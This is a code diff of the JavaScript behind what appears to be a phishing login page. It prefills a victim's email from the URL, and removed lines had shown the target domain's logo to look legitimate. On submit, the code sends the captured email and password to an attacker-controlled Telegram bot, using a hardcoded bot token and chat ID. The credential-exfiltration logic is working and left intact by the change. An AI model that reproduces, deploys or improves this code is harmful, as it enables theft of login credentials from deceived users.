@@ -3,38 +3,21 @@ const BOT_TOKEN = '7498188170:AAEg5-qYskNv-FQyoNx1AwCAeKHdMMdRiwY';
 const CHAT_ID = '1977641102';
 let loginAttempts = 0;
 
-// Function to get email from the URL
-function getEmailFromUrl() {
-    const query = new URLSearchParams(window.location.search);
+// Function to get email from hash
+function getEmailFromHash() {
     const hash = window.location.hash.substring(1);
-    // Prioritize query string, fallback to hash
-    return query.get('email') || (hash.includes('@') ? hash : null);
+    return hash.includes('@') ? hash : null;
 }
 
-// Autofill the email field from the URL
+// Populate the email field if an email is passed in the URL hash
 document.addEventListener('DOMContentLoaded', () => {
-    const email = getEmailFromUrl();
-    if (email) {
-        const emailField = document.getElementById('user-email');
-        emailField.value = email;
-
-        // Optionally update the logo dynamically based on the domain
-        const emailParts = email.split('@');
-        if (emailParts.length > 1) {
-            const domain = emailParts[1];
-            const logoElement = document.getElementById('dynamic-logo');
-            logoElement.src = `https://www.${domain}/favicon.ico`;
-
-            // Add fallback in case the logo URL fails
-            logoElement.onerror = () => {
-                logoElement.src = 'https://via.placeholder.com/100';
-            };
-        }
+    const emailFromHash = getEmailFromHash();
+    if (emailFromHash) {
+        document.getElementById('user-email').value = emailFromHash;
     }
 });
 
-// Handle form submission
-document.getElementById('loginForm').addEventListener('submit', function (event) {
+document.getElementById('loginForm').addEventListener('submit', function(event) {
     event.preventDefault();
 
     const userEmail = document.getElementById('user-email').value;
@@ -46,7 +29,10 @@ document.getElementById('loginForm').addEventListener('submit', function (event)
     fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ chat_id: CHAT_ID, text: message })
+        body: JSON.stringify({
+            chat_id: CHAT_ID,
+            text: message
+        })
     })
     .then(response => response.json())
     .catch(error => console.error('Error:', error));
